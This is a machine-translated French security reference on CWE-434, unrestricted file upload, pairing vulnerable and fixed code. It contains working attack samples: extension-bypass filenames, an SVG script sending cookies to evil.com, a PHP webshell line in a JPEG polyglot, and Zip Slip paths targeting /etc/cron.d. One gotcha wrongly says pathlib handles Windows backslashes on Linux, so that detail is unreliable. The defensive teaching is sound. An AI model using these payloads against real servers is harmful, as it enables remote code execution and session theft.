---
description: "CWE-434 : téléversement sans restriction de type de fichier dangereux. Les fichiers téléversés s'exécutent sur le serveur. Contournement d'extension, confusion de type MIME, XSS via SVG, fichiers polyglottes, traversée de chemin dans le nom de fichier."
date: 2026-04-16
tags: [security, cwe, file-upload, rce, web, xss, path-traversal]
level: Advanced
source_sha256: 602eda7c62a27879e9e91e278404d80a40e1172364a82782aef2fbfbc5fa8210
translation: machine
translated_at: '2026-10-24'
---
# CWE-434 : téléversement sans restriction de type de fichier dangereux {#cwe-434-unrestricted-upload-of-dangerous-file-type}

**Rang dans le CWE Top 25 :** 10 (2024).
**Étendue de l'impact :** RCE (téléversement d'un shell PHP/JSP), XSS stockée (téléversement de SVG/HTML), traversée de chemin (écrasement de fichiers de configuration), DoS (téléversement de bombe ZIP, de scripts en boucle infinie).
**Problème central :** le serveur accepte et stocke des fichiers que le serveur ou les clients vont ensuite exécuter ou rendre dans un contexte privilégié.

---

## Sémantique fonctionnelle {#functional-semantics}

La vulnérabilité se manifeste dans deux contextes d'exécution distincts :

1. **Exécution côté serveur :** le fichier téléversé est placé dans un répertoire servi par un runtime applicatif (PHP, Python, Node.js, JSP/Servlet), ce qui permet à l'attaquant de demander le fichier et de faire exécuter le code par le serveur.
2. **Exécution côté client :** le fichier téléversé est servi à d'autres utilisateurs avec un type MIME qui amène le navigateur à l'exécuter (SVG contenant du JS intégré, fichiers HTML, XML avec XSLT).

Impact secondaire sans exécution : la **traversée de chemin dans le nom de fichier** permet d'écraser des fichiers arbitraires sur le serveur ; les **bombes ZIP/archives** provoquent un épuisement des ressources.

---

## Techniques de contournement d'extension {#extension-bypass-techniques}

### Double extension {#double-extension}

```text
shell.php.jpg    # Apache with misconfigured AddHandler will execute as PHP
shell.php%00.jpg # Null byte truncation in older PHP: stored as shell.php
shell.pHp        # Case-insensitive file system + case-insensitive extension check
shell.php5       # Alternative PHP extension not in blocklist
shell.phtml      # Another PHP alternative extension
shell.shtml      # Apache SSI - Server Side Includes execution
```

**Listes de blocage incomplètes (erreurs courantes) :**

```python
# VULNERABLE: blocklist approach, incomplete
BLOCKED_EXTENSIONS = {'.php', '.asp', '.aspx', '.py', '.rb'}

def validate_upload(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext in BLOCKED_EXTENSIONS:
        raise ValueError("Dangerous file type")
    # Misses: .php5, .phtml, .shtml, .cgi, .pl, .jsp, .jspx, .cfm, etc.
```

```python
# FIXED: allowlist approach - only permit explicitly safe types
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf', '.mp4'}

def validate_upload(filename):
    # Use pathlib to handle complex extension cases
    ext = pathlib.Path(filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File type not permitted: {ext}")
```

### Injection d'octet nul (PHP ancien / systèmes anciens) {#null-byte-injection-legacy-phpolder-systems}

```text
# HTTP multipart body:
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# PHP < 5.3.4: null byte truncates the string → stored as shell.php
# Modern PHP: fixed, but may exist in custom C extensions
```

### Traversée de chemin lors de l'extraction d'archives (Zip Slip) {#archive-extraction-path-traversal-zip-slip}

```python
# VULNERABLE: extracting ZIP without path validation
import zipfile

def extract_upload(zip_path, dest_dir):
    with zipfile.ZipFile(zip_path) as zf:
        zf.extractall(dest_dir)   # archive may contain ../../etc/cron.d/evil
```

```python
# FIXED: validate each member path stays within dest_dir
import zipfile, pathlib

def safe_extract(zip_path, dest_dir):
    dest = pathlib.Path(dest_dir).resolve()
    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            member_path = (dest / member).resolve()
            if not str(member_path).startswith(str(dest)):
                raise ValueError(f"Path traversal attempt: {member}")
            zf.extract(member, dest_dir)
```

---

## Confusion de type MIME {#mime-type-confusion}

### Content-Type fourni par le client (à ne jamais faire confiance) {#client-supplied-content-type-never-trust}

```python
# VULNERABLE: trusting browser-provided Content-Type
def handle_upload(request):
    content_type = request.FILES['file'].content_type   # from HTTP header, attacker-controlled
    if content_type.startswith('image/'):
        save_file(request.FILES['file'])   # attacker sends PHP shell with Content-Type: image/jpeg
```

```python
# FIXED: detect MIME from file content (magic bytes), not headers
import magic   # python-magic library

def handle_upload(request):
    uploaded = request.FILES['file']
    file_bytes = uploaded.read(2048)
    uploaded.seek(0)

    detected_mime = magic.from_buffer(file_bytes, mime=True)
    if detected_mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f"Detected type {detected_mime} not allowed")
    save_file(uploaded)
```

**Octets magiques pour les types courants :**

| Type | Premiers octets |
|------|-----------------|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` (`GIF8`) |
| PDF | `25 50 44 46` (`%PDF`) |
| ZIP | `50 4B 03 04` |
| PHP | `3C 3F 70 68` (`<?ph`) - toujours rejeter cette signature dans les téléversements d'images |

---

## SVG contenant du JavaScript intégré (XSS stockée) {#svg-with-embedded-javascript-stored-xss}

Le SVG est du XML et peut contenir des balises `<script>`. Lorsqu'il est servi en tant que `image/svg+xml`, les navigateurs exécutent le JavaScript dans le contexte d'origine de la page.

```svg
<!-- ATTACK: uploaded as avatar.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Executes in the origin of the site serving this SVG
    document.cookie  // accessible
    fetch('https://evil.com/steal?c=' + document.cookie)
  </script>
  <rect width="100" height="100"/>
</svg>
```

**Options de correction :**

```python
# Option 1: reject SVG entirely if user-generated content
ALLOWED_IMAGE_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
# image/svg+xml NOT in this set

# Option 2: if SVG needed, sanitize with bleach/DOMPurify on the server
import bleach

def sanitize_svg(svg_content: str) -> str:
    # Allow structural SVG tags, disallow script/foreignObject/use href tricks
    allowed_tags = {'svg', 'path', 'circle', 'rect', 'line', 'g', 'text', 'defs'}
    allowed_attrs = {'viewBox', 'width', 'height', 'd', 'fill', 'stroke', 'cx', 'cy', 'r'}
    return bleach.clean(svg_content, tags=allowed_tags, attributes=allowed_attrs, strip=True)

# Option 3: serve SVG with Content-Disposition: attachment (no execution in browser)
# and Content-Type: application/octet-stream
```

---

## Fichiers polyglottes {#polyglot-files}

Un fichier simultanément valide dans deux formats. Exemple : un JPEG valide qui est aussi un script PHP valide.

```text
# JPEG header
FF D8 FF E0  ...  [valid JPEG data]

# After JPEG data, PHP code appended (JPEG parser ignores trailing data)
<?php system($_GET['cmd']); ?>
```

Le JPEG s'affiche correctement dans une visionneuse d'images. S'il est servi via PHP avec certains motifs `eval` ou inclus via `include`, l'interpréteur PHP l'exécute.

**Défense :** retraitement des images (ré-encodage de toutes les images téléversées) :

```python
from PIL import Image
import io

def sanitize_image_upload(file_bytes: bytes) -> bytes:
    """Re-encode image to strip appended code and EXIF payloads."""
    img = Image.open(io.BytesIO(file_bytes))
    img.verify()  # raises if not valid image

    # Re-open (verify() leaves the file at end of stream)
    img = Image.open(io.BytesIO(file_bytes))
    output = io.BytesIO()
    # Re-encode: strips EXIF, appended PHP, embedded JS in metadata
    img.save(output, format=img.format or 'JPEG', exif=b'')
    return output.getvalue()
```

---

## Traversée de chemin dans le nom de fichier {#path-traversal-in-filename}

```python
# VULNERABLE: using user-supplied filename directly
def save_upload(filename, data):
    path = os.path.join('/var/uploads', filename)
    # filename = '../../etc/cron.d/evil' → writes to /etc/cron.d/evil
    with open(path, 'wb') as f:
        f.write(data)
```

```python
# FIXED: use only the basename, generate server-side name
import uuid, pathlib

def save_upload(filename: str, data: bytes) -> str:
    # Extract only the base filename, discard any directory components
    safe_name = pathlib.Path(filename).name   # strips ../../ prefixes
    ext = pathlib.Path(safe_name).suffix.lower()

    # Better: generate a new UUID-based name entirely (avoids name conflicts + traversal)
    stored_name = f"{uuid.uuid4()}{ext}"
    dest = pathlib.Path('/var/uploads') / stored_name

    # Paranoid check: verify final path is within uploads dir
    if not str(dest.resolve()).startswith('/var/uploads'):
        raise ValueError("Path traversal detected")

    dest.write_bytes(data)
    return stored_name
```

---

## Téléversement dans la racine web / contexte d'exécution {#upload-to-webroot-execution-context}

Un fichier qui serait inoffensif en tant que téléchargement devient dangereux lorsqu'il est placé dans un répertoire servi par le runtime applicatif.

```nginx
# VULNERABLE nginx + php-fpm config
location /uploads/ {
    # Files served from here
}
location ~ \.php$ {
    fastcgi_pass php-fpm;
    # If upload dir overlaps with PHP-served dir, uploaded .php files execute
}
```

```nginx
# FIXED: explicitly disable execution in uploads directory
location /uploads/ {
    add_header Content-Disposition "attachment";
    location ~ \.(php|phtml|php5|shtml|cgi|pl|jsp)$ {
        deny all;   # block execution even if misconfigured
    }
}
```

**Principe :** les fichiers téléversés ne doivent jamais être stockés dans la racine du code ou des templates de l'application, ni en dessous. Servir depuis une origine distincte (`static.example.com`) ou depuis un stockage objet (S3, GCS) sans capacité d'exécution.

---

## Écosystèmes concernés {#affected-ecosystems}

| Écosystème | Risques spécifiques | Remarques |
|------------|---------------------|-----------|
| PHP | Exécution de `.php`, `.phtml`, `.php5` | Le plus critique ; un `include` PHP à partir d'un chemin de fichier mène à une RCE |
| Python/Django | Indirect (pas d'exécution directe de fichiers) ; XSS via SVG | Les fichiers statiques sont servis différemment ; Django n'exécute pas les fichiers téléversés |
| Java/JSP | Exécution de `.jsp`, `.jspx` si placés dans la racine de l'application web | Un téléversement dans `WEB-INF/` peut contourner les protections ; hors racine web, c'est sûr |
| Node.js | Pas d'exécution de fichiers depuis le disque par défaut ; injection via `require()` possible | XSS via SVG avec `res.sendFile` et un mauvais Content-Type |
| Ruby on Rails | Mauvaises configurations de CarrierWave/Paperclip ; XSS via SVG | Content-Type déduit de l'extension du nom de fichier : vérifier le cas `.svg` |
| ASP.NET | Exécution de `.aspx`, `.ashx` si dans un répertoire servi par IIS | IIS sert les `.aspx` depuis n'importe où dans la racine web |
| Go | Pas d'exécution de fichiers intégrée ; XSS via SVG avec `http.ServeFile` | Exécution personnalisée via `os/exec` avec le nom de fichier téléversé possible |

---

## Heuristiques de détection {#detection-heuristics}

1. Repérer les gestionnaires de téléversement : rechercher `multipart/form-data`, `request.FILES`, `UploadedFile`, `MultipartFile`, `IFormFile`, `upload.single()`.
2. Pour chaque gestionnaire, vérifier : existe-t-il une liste d'extensions autorisées (et non une liste de blocage) ? Une validation MIME par octets magiques (et non par l'en-tête `Content-Type`) est-elle en place ?
3. Vérifier où les fichiers téléversés sont stockés : le chemin est-il à l'intérieur de la racine web ? Le répertoire est-il servi avec des permissions d'exécution ?
4. Vérifier si le nom de fichier stocké provient d'une entrée utilisateur : champ `filename` de `Content-Disposition`. Tout composant de chemin issu de l'utilisateur sans `basename()` constitue une traversée de chemin.
5. Pour les téléversements d'images : y a-t-il un retraitement (Pillow, `convert` d'ImageMagick) ? Sans retraitement, il existe un risque de charge utile dans les polyglottes ou les métadonnées.
6. Vérifier le `Content-Type` servi : les fichiers téléversés sont-ils servis avec le bon type, ou le serveur le devine-t-il à partir de l'extension ?

```bash
# Grep patterns
grep -rn "request.FILES\|multipart\|upload" --include="*.py" -l
grep -rn "\.filename\|getOriginalFilename\|getClientFilename" --include="*.java" -l
grep -rn "req\.file\|multer\|busboy" --include="*.js" -l
grep -rn "IFormFile\|HttpPostedFileBase" --include="*.cs" -l
```

---

## Modèles de correction {#fixing-patterns}

| Contrôle | Mise en œuvre |
|----------|---------------|
| Liste d'extensions autorisées | `ALLOWED_EXT = {'.jpg', '.png', '.pdf'}; if ext not in ALLOWED_EXT: reject` |
| MIME à partir des octets magiques | `python-magic`, `file-type` (npm), `net/http.DetectContentType` (Go) |
| Stockage hors de la racine web | Téléverser dans `/var/uploads/` (et non dans `/var/www/`) ou dans un stockage objet |
| Origine statique séparée | Servir les téléversements depuis `uploads.example.com` : une origine différente empêche le vol de cookies |
| Noms de fichiers UUID | `stored_as = str(uuid4()) + ext` : empêche la traversée de chemin et la devinette de noms |
| Retraitement d'image | `PIL.Image.open() → img.save()` supprime le code ajouté en fin de fichier et les données EXIF |
| En-tête Content-Disposition | `Content-Disposition: attachment` force le téléchargement au lieu du rendu |
| Analyse antivirus | ClamAV sur les fichiers téléversés : détecte les malwares connus, pas les shells personnalisés |
| Limite de taille de fichier | Empêche les bombes ZIP ; `MAX_UPLOAD_SIZE = 10 * 1024 * 1024` |

---

## Pièges : indicateurs de faux positifs {#gotchas-false-positive-indicators}

- **Points de téléversement réservés aux administrateurs, sans accès pour les utilisateurs externes :** profil de risque plus faible, mais la compromission d'un compte administrateur reste exploitable ; ce n'est pas une absence de risque.
- **Téléversement vers un stockage objet (S3/GCS) avec une politique `NoExecute` :** les fichiers stockés dans S3 ne peuvent pas être exécutés côté serveur ; une XSS via SVG reste possible s'ils sont servis directement depuis S3 sans `Content-Disposition: attachment`.
- **Validation de `Content-Type: image/jpeg` via l'en-tête** envoyé par le navigateur : ce n'est pas une correction, c'est une valeur fournie par le client. Elle n'a de sens que si la validation utilise `magic.from_buffer()`.
- **`os.path.basename()` avec des chemins Windows sous Linux :** `os.path.basename('C:\\..\\evil.php')` sous Linux renvoie `C:\\..\\evil.php` (et non seulement le nom de fichier). Utiliser `pathlib.Path(filename).name`, qui gère les deux séparateurs.
- **Bibliothèques d'images tolérant les en-têtes corrompus :** PIL `Image.open()` lève une exception sur les fichiers réellement invalides, mais accepte de nombreux polyglottes. Le motif fiable est `img.verify()`, puis réouverture et réenregistrement.

---

## Voir aussi {#see-also}

- CWE-22 : Traversée de chemin (path traversal) dans le composant nom de fichier
- CWE-79 : XSS (conséquence via un téléversement de SVG/HTML)
- CWE-352 : CSRF (souvent combiné au téléversement de fichiers pour forcer l'upload de la victime)
- CWE-732 : Permissions non sécurisées (permissions du répertoire de téléversement permettant l'exécution)
- [[web-application-security-fundamentals]] : contexte plus large de la sécurité web
